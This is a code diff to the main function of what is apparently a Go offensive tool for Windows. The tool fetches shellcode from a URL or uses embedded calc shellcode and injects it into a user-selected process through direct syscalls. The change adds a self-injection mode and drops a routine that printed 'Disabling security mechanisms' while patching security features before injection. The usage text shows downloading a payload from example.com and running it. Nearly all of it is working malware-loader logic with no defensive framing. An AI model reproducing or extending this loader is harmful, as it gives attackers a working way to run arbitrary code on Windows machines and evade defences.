@@ -6,7 +6,6 @@ import (
 	"flag"
 	"fmt"
 	"io"
-	"math/rand"
 	"net/http"
 	"os"
 	"sort"
@@ -471,8 +470,9 @@ func main() {
 	
 	// Parse command line flags
 	urlFlag := flag.String("url", "", "URL to download shellcode from")
-	exampleFlag := flag.Bool("example", false, "Execute embedded calc shellcode")
+	exampleFlag := flag.Bool("example", false, "Execute embedded calc shellcode (uses self-injection by default)")
 	dumpFlag := flag.Bool("dump", false, "Dump all available syscalls from ntdll.dll")
+	selfFlag := flag.Bool("self", false, "Use self-injection instead of remote process injection")
 
 	flag.Parse()
 
@@ -580,9 +580,10 @@ func main() {
 		if url == "" {
 			fmt.Println("Error: You must specify either -url, -example, or -dump flag")
 			fmt.Println("Usage:")
-			fmt.Println("  ./cmd.exe -url http://example.com/payload.bin")
-			fmt.Println("  ./cmd.exe -example")
-			fmt.Println("  ./cmd.exe -dump")
+			fmt.Println("  ./cmd.exe -url http://example.com/payload.bin                    # Remote injection")
+			fmt.Println("  ./cmd.exe -url http://example.com/payload.bin -self             # Self injection")
+			fmt.Println("  ./cmd.exe -example                                              # Self injection with embedded calc")
+			fmt.Println("  ./cmd.exe -dump                                                 # Dump syscalls")
 			os.Exit(1)
 		}
 		
@@ -594,112 +595,56 @@ func main() {
 		}
 	}
 	
-	// Get list of accessible processes
-	allProcesses, err := getProcessList()
-	if err != nil {
-		fmt.Printf("Failed to get process list: %v\n", err)
-		return
-	}
-	
-	// Always filter out system processes for cleaner user experience
-	systemProcesses := []string{
-		"system", "smss.exe", "csrss.exe", "wininit.exe", "winlogon.exe",
-		"services.exe", "lsass.exe", "svchost.exe", "dwm.exe", "explorer.exe",
-		"fontdrvhost.exe", "sihost.exe", "taskhostw.exe", "conhost.exe",
-		"dllhost.exe", "ctfmon.exe", "perfhost.exe", "audiodg.exe",
-		"runtimebroker.exe", "searchindexer.exe", "searchfilterhost.exe",
-		"searchprotocolhost.exe", "searchapp.exe", "startmenuexperiencehost.exe",
-		"shellexperiencehost.exe", "textinputhost.exe", "applicationframehost.exe",
-		"wmiprvse.exe", "vssvc.exe", "registry", "secure system",
-		"lsaiso.exe", "credentialenrollmentmanager.exe", "compkgsrv.exe",
-	}
-	
-	var processes []ProcessInfo
-	for _, proc := range allProcesses {
-		isSystem := false
-		for _, sysProc := range systemProcesses {
-			if strings.EqualFold(proc.Name, sysProc) {
-				isSystem = true
-				break
-			}
-		}
-		if !isSystem {
-			processes = append(processes, proc)
-		}
-	}
-	
-	if len(processes) == 0 {
-		fmt.Println("No user processes found.")
-		return
-	}
-	
-	fmt.Printf("Showing %d user processes (system processes hidden :3)\n", len(processes))
+	// Determine injection method: self-injection or remote injection
+	useSelfInjection := *exampleFlag || *selfFlag // Default to self-injection for example mode
 	
 	var selectedProcess ProcessInfo
 	
-	if *exampleFlag {
-		// Auto-select a safe process for example mode with rotation
-		safeProcesses := []string{"notepad.exe", "calc.exe", "mspaint.exe", "wordpad.exe", "write.exe", "onedrive.exe", "powershell.exe", "chrome.exe", "firefox.exe", "iexplore.exe", "msedge.exe", "code.exe", "notepad++.exe", "sublime_text.exe", "atom.exe", "putty.exe", "winscp.exe", "7zfm.exe", "winrar.exe", "vlc.exe", "wmplayer.exe"}
+	if useSelfInjection {
+		fmt.Println("Using self-injection mode")
+	} else {
+		// Remote injection mode - get process list and let user select
+		allProcesses, err := getProcessList()
+		if err != nil {
+			fmt.Printf("Failed to get process list: %v\n", err)
+			return
+		}
 		
-		// Find all available safe processes
-		var availableSafeProcesses []ProcessInfo
-		for _, proc := range processes {
-			for _, safeProc := range safeProcesses {
-				if strings.EqualFold(proc.Name, safeProc) {
-					availableSafeProcesses = append(availableSafeProcesses, proc)
+		// Filter out system processes for cleaner user experience
+		systemProcesses := []string{
+			"system", "smss.exe", "csrss.exe", "wininit.exe", "winlogon.exe",
+			"services.exe", "lsass.exe", "svchost.exe", "dwm.exe", "explorer.exe",
+			"fontdrvhost.exe", "sihost.exe", "taskhostw.exe", "conhost.exe",
+			"dllhost.exe", "ctfmon.exe", "perfhost.exe", "audiodg.exe",
+			"runtimebroker.exe", "searchindexer.exe", "searchfilterhost.exe",
+			"searchprotocolhost.exe", "searchapp.exe", "startmenuexperiencehost.exe",
+			"shellexperiencehost.exe", "textinputhost.exe", "applicationframehost.exe",
+			"wmiprvse.exe", "vssvc.exe", "registry", "secure system",
+			"lsaiso.exe", "credentialenrollmentmanager.exe", "compkgsrv.exe",
+		}
+		
+		var processes []ProcessInfo
+		for _, proc := range allProcesses {
+			isSystem := false
+			for _, sysProc := range systemProcesses {
+				if strings.EqualFold(proc.Name, sysProc) {
+					isSystem = true
 					break
 				}
 			}
-		}
-		
-		// If we found safe processes, randomly select one for rotation
-		found := false
-		if len(availableSafeProcesses) > 0 {
-			// Seed random number generator with current time for rotation
-			rand.Seed(time.Now().UnixNano())
-			selectedIndex := rand.Intn(len(availableSafeProcesses))
-			selectedProcess = availableSafeProcesses[selectedIndex]
-			found = true
-			fmt.Printf("Auto-selected safe process (rotated): %s (PID: %d) [%d/%d available]\n", 
-				selectedProcess.Name, selectedProcess.Pid, selectedIndex+1, len(availableSafeProcesses))
-		}
-		
-		// If no known safe process found, randomly select from non-system processes
-		if !found {
-			// Skip common system processes
-			systemProcesses := []string{"system", "smss.exe", "csrss.exe", "wininit.exe", "winlogon.exe", 
-				"services.exe", "lsass.exe", "svchost.exe", "dwm.exe", "explorer.exe"}
-			
-			var nonSystemProcesses []ProcessInfo
-			for _, proc := range processes {
-				isSystem := false
-				for _, sysProc := range systemProcesses {
-					if strings.EqualFold(proc.Name, sysProc) {
-						isSystem = true
-						break
-					}
-				}
-				if !isSystem {
-					nonSystemProcesses = append(nonSystemProcesses, proc)
-				}
-			}
-			
-			if len(nonSystemProcesses) > 0 {
-				rand.Seed(time.Now().UnixNano())
-				selectedIndex := rand.Intn(len(nonSystemProcesses))
-				selectedProcess = nonSystemProcesses[selectedIndex]
-				found = true
-				fmt.Printf("Auto-selected process (rotated): %s (PID: %d) [%d/%d available]\n", 
-					selectedProcess.Name, selectedProcess.Pid, selectedIndex+1, len(nonSystemProcesses))
+			if !isSystem {
+				processes = append(processes, proc)
 			}
 		}
 		
-		if !found {
-			fmt.Println("No suitable safe process found for auto-injection")
+		if len(processes) == 0 {
+			fmt.Println("No user processes found.")
 			return
 		}
-	} else {
-		// Display process list for manual selection when using URL
+		
+		fmt.Printf("Using remote injection mode - showing %d user processes\n", len(processes))
+		
+		// Display process list for manual selection
 		fmt.Println("\nAvailable processes:")
 		fmt.Println("-------------------")
 		for i, proc := range processes {
@@ -737,29 +682,26 @@ func main() {
 	}
 
 	
-	// Apply security patches before injection
-	fmt.Println("Disabling security mechanisms...")
-	successful, failed := winapi.ApplyAllPatches()
-	
-	// Report patch results
-	for _, name := range successful {
-		fmt.Printf("Patching %s... SUCCESS\n", name)
-	}
-	for name, err := range failed {
-		fmt.Printf("Patching %s... FAILED: %v\n", name, err)
-	}
-	
-	if len(successful) > 0 {
-		fmt.Printf("Successfully applied %d/%d security patches\n", len(successful), len(successful)+len(failed))
-	}
-	
-	// Perform the injection
-	fmt.Printf("Injecting payload into %s (PID: %d)\n", selectedProcess.Name, selectedProcess.Pid)
-	err = directSyscallInjector(payload, selectedProcess.Pid)
-	
-	if err != nil {
-		fmt.Printf("Injection failed: %v\n", err)
+	// Perform the injection based on selected method
+	if useSelfInjection {
+		// Self-injection
+		fmt.Println("Injecting payload into current process (self-injection)")
+		err = winapi.NtInjectSelfShellcode(payload)
+		
+		if err != nil {
+			fmt.Printf("Self-injection failed: %v\n", err)
+		} else {
+			fmt.Println("Self-injection Successful")
+		}
 	} else {
-		fmt.Println("Injection Successful")
+		// Remote injection
+		fmt.Printf("Injecting payload into %s (PID: %d)\n", selectedProcess.Name, selectedProcess.Pid)
+		err = directSyscallInjector(payload, selectedProcess.Pid)
+		
+		if err != nil {
+			fmt.Printf("Remote injection failed: %v\n", err)
+		} else {
+			fmt.Println("Remote injection Successful")
+		}
 	}
 }
